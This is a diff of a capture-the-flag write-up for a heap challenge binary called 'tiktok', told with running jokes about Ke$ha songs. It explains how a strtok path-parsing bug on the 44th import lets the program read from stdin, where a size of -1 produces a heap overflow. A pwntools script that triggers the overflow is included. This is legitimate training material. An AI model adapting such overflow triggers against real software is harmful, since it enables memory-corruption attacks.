@@ -38,7 +38,7 @@ Before I leave, brush my teeth with a bottle of Jack
 
 The very first step, and probably the most important part of solving this challenge, is to put on Ke$ha. Personally, I preferred her most recent album for vulnerability discovery, and her earlier work for exploitation, but to each their own. 
 
-After I had [Praying](https://www.youtube.com/watch?v=v-Dur3uXXCQ) playing, I ran the binary. This was the output:
+After we have [Praying](https://www.youtube.com/watch?v=v-Dur3uXXCQ) playing, let's run the binary. This is the output:
 
 ```
 ➜ ./tiktok
@@ -54,9 +54,9 @@ So what would you like to do today?
 Choice:
 ```
 
-Next I decompiled the binary. Option2 2 and 5 were rather straightforward (2 outputs the playlist and 5 exits the program), but Options 1, 3, and 4 looked interesting. 
+Next we decompile the binary. Option2 2 and 5 were rather straightforward (2 outputs the playlist and 5 exits the program), but Options 1, 3, and 4 looked interesting. 
 
-##### Import Song
+#### Import Song
 
 Below is the edited decompilation of `import_song`, the function that gets called when selecting Option 1. 
 
@@ -74,7 +74,7 @@ The first 24 bytes of the struct is a 24 bytes array of the song file path. Dire
 
 Where do the first two pointers get assigned? In lines 30 and 32, with Ke$ha's favorite function, [strtok](http://www.cplusplus.com/reference/cstring/strtok/). While my first instinct was to look there for vulnerabilities, that would be a rookie mistake. Clearly the first thing any good vulnerability researcher would do at this situation is put on [TikTok](https://www.youtube.com/watch?v=iP6XpLQM2Cs) by Ke$ha.
 
-Now that I was appropriately in the zone, I could look at the strtoks. Obviously in real life, it took some time to find the bug, so let's fast forward to probably the 10th round of TikTok, at which point I felt the need to change [songs](https://www.youtube.com/watch?v=1yYV9-KoSUM). The first strtok scans the song_file_path to find a token ending in `/` character. Once done, it replaces that with a null byte, and returns a pointer to the beginning of the token. The second strtok starts at the byte afterwhich the last strtok call left off, so in this case the beginning of our song name, and scans until it finds a '.' character, at which point it replaces that '.' with a nullbyte and returns a pointer to the beginning of the song name. 
+Now that we are appropriately in the zone, we can look at the strtoks. Obviously in real life, it took some time to find the bug, so let's fast forward to probably the 10th round of TikTok, at which point I felt the need to change [songs](https://www.youtube.com/watch?v=1yYV9-KoSUM). The first strtok scans the song_file_path to find a token ending in `/` character. Once done, it replaces that with a null byte, and returns a pointer to the beginning of the token. The second strtok starts at the byte afterwhich the last strtok call left off, so in this case the beginning of our song name, and scans until it finds a '.' character, at which point it replaces that '.' with a nullbyte and returns a pointer to the beginning of the song name. 
 
 This is all just a very verbose way of saying that it parses the parent directory and song name into seperate strings, stripping off the '/' and '.txt'. i.e. 
 `songs[i].song_file_path = "Animal/tiktok.txt"` will become `songs[i].song_file_path = "Animal<0x00>tiktok<0x00>txt"`
@@ -91,11 +91,82 @@ If I import a song path of 24 bytes on my 44th import, and my song path contains
 
 What can we do with this behavior? First we need to put on [Woman](https://www.youtube.com/watch?v=lXyA4MXKIKo) by Ke$ha. Next we look at where the fd gets read from, which is in `play_song` (Option 3). 
 
+#### Play Song
+
 ![play_song](../../images/play_song.png)
 
+If a song has not yet been played, i.e. it's `lyrics_ptr_to_heap` has not been set (line 26), `play_song` will read in a line telling it the size of the file (`nbytes`). As you can see in the example song file shown above `Animal/tiktok.txt`is 2117 bytes. If we are inputting from stdin, we could put in a file size of our choosing, including -1. Then, our program mallocs a chunk of exactly `nbytes + 1` (if we were to give -1 as the size `nbytes` then it would `malloc(0)`. It then calls `memset` on the bytes just malloc'd, setting them to null bytes. Then it reads in `nbytes` of data into a heap chunk (if `nbytes = -1` it would read in -1 bytes which, as an unsigned int, is a lot of bytes). So with this, we can import 44 songs, and use the last one to overwrite a heap chunk. 
 
+Before we move on to exploitation, let's put on [more Ke$has](youtube.com/watch?time_continue=4&v=sqV9iWiSWh8) and look at the last function of interest.
+
+#### Remove Song
 
 ![remove_song](../../images/remove_song.png)
+
+Option 4 allows a user to remove a song, which sets its struct pointer to null, calls `free` on its lyrics pointer, and closes its file descriptor. It doesn't decrement song count however (although this never matters). 
+
+So, given the `malloc` and `free` it seems like we're working with a heap challenge. 
+
+### Exploitation
+
+First, let's check to see if that vulnerability works how we think it does. 
+
+```python
+from pwn import *
+
+p = process(["rr", "record", "./tiktok"])
+# p = process("./tiktok") # for running without rr 
+
+def import_song(path):
+    p.readuntil("Choice:")
+    p.sendline("1")
+    print(p.readuntil("Please provide the entire file path."))
+    p.sendline(path)
+    
+def play_song(song):
+    p.readuntil("Choice:")
+    p.sendline("3")
+    p.readuntil("Choice:")
+    p.sendline(song)
+
+def remove_song(song):
+    p.readuntil("Choice:")
+    p.sendline("4")
+    p.readuntil("Choice:")
+    p.sendline(song)
+    
+for i in range(1, 44):
+    import_song("Animal/godzilla.txt")
+
+album = "Cannibal"
+import_song(album + "/" * (24-len(album))) 
+
+play_song("44")
+p.sendline("-1")
+
+play_song("44")
+p.sendline("-1")
+p.send("A" * 100)
+
+p.interactive()
+```
+To make it easier, I defined a couple helper functions from the start. I'm also running the binary with [https://rr-project.org](https://rr-project.org/) which is great, and I highly recommend. It records the execution and allows you to step through it as you would in gdb normally (with gef/peda/etc.) but you can also reverse-continue, reverse-step, reverse-next, etc. As I said, it's amazing. 
+
+I imported 43 songs normally and for the 44th one, I gave it the file path `Cannibal////////////////` since the name must be 24 bytes without any '.' for this to work. Then I play that song, giving it -1 as a file size and a bunch of 'A's. Let's see what happens in rr/gdb/gef. 
+
+At the end of execution, here is what the song struct array looks like. For the 43 normal song structs, they look like this:
+
+![normal_song_struct](../../images/normal_song_struct.png)
+
+This has been given 19 as its file descriptor. Now let's look at our 44th song:
+
+![song_struct_44](../../images/song_struct_44.png)
+
+Where there's a 19 in the first struct, there's a 0 in this one where there should be a 46, and the lyrics pointer to the heap at the bottom of the struct looks promising. Let's see what our heap looks like: 
+
+![heap_overflow](../../images/heap_overflow.png)
+
+Great, we have a heap overflow! 
 
 
 
